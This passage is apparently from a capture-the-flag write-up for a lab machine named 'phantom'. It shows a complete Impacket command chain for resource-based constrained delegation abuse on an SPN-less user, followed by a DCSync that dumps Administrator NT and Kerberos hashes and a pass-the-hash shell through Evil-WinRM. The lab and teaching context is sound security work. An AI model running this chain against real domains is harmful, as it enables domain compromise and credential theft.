https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd#rbcd-on-spn-less-users

The technique is as follows:

1. Obtain a TGT for the SPN-less user allowed to delegate to a target and retrieve the TGT session key.
2. Change the user’s password hash and set it to the TGT session key.
3. Combine S4U2self and U2U so that the SPN-less user can obtain a service ticket to itself, on behalf of another (powerful) user, and then proceed to S4U2proxy to obtain a service ticket to the target the user can delegate to, on behalf of the other, more powerful, user.
4.Pass the ticket and access the target as the delegated other.

First, let’s add wsilva as the account that can act on behalf of others to DC.

```bash
└─$ impacket-rbcd -delegate-to 'DC$' -delegate-from wsilva -dc-ip '10.129.145.232' -action 'write' 'phantom'/'wsilva':'Password123'                    
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] wsilva can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     wsilva       (S-1-5-21-4029599044-1972224926-2225194048-1114)
```
Now let’s create a TGT for wsilva.

```bash
└─$ impacket-getTGT phantom.vl/wsilva:Password123
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in wsilva.ccache
```
now i need to grab a ticket session key from the .ccache file i just created.

```bash
└─$ impacket-describeTicket 'wsilva.ccache' | grep 'Ticket Session Key'
[*] Ticket Session Key            : 46567c9a23cd0913743b1f2a90d234c8eb4e88f1e963b8da564304e6cb421968
```
With changepasswd we change wsilva’s NT hash to the TGT session key.

```bash
└─$ impacket-changepasswd -newhashes :46567c9a23cd0913743b1f2a90d234c8eb4e88f1e963b8da564304e6cb421968 'phantom.vl'/'wsilva':'Password123'@'10.129.145.232' 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Changing the password of phantom.vl\wsilva
[*] Connecting to DCE/RPC as phantom.vl\wsilva
[*] Password was changed successfully.
[!] User might need to change their password at next logon because we set hashes (unless password never expires is set).
```
Now I can request a ticket for Administrator.

```bash
└─$ KRB5CCNAME=wsilva.ccache impacket-getST -u2u -impersonate Administrator -spn cifs/DC.phantom.vl phantom.vl/wsilva -k -no-pass
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating Administrator
[*] Requesting S4U2self+U2U
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC.phantom.vl@PHANTOM.VL.ccache
```
Since we have Administrator ccache, we can DCSync to get the Domain Admin NT hash.

```bash
─$ KRB5CCNAME=Administrator@cifs_DC.phantom.vl@PHANTOM.VL.ccache impacket-secretsdump -k -no-pass phantom.vl/Administrator@DC.phantom.vl -just-dc-user Administrator
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:aa2abd9db4f5984e657f834484512117:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:82b06cc6f32916467e0ce67dca982b602b672729672954d7c582d6d15c2351f2
Administrator:aes128-cts-hmac-sha1-96:df1edf2fba6e16750d8ba64ebbd6b28c
Administrator:des-cbc-md5:d98ffeadb56babfd
[*] Cleaning up... 
```
And authenticate with the hash to Evil-WinRM.

```bash
└─$ evil-winrm -i 10.129.145.232 -u Administrator -H aa2abd9db4f5984e657f834484512117
Evil-WinRM shell v3.7
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
phantom\administrator
```
We have successfully got the Administrator shell. Let’s grab the flag and finish the machine.

```bash
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
ab68b<REDACTED>
```
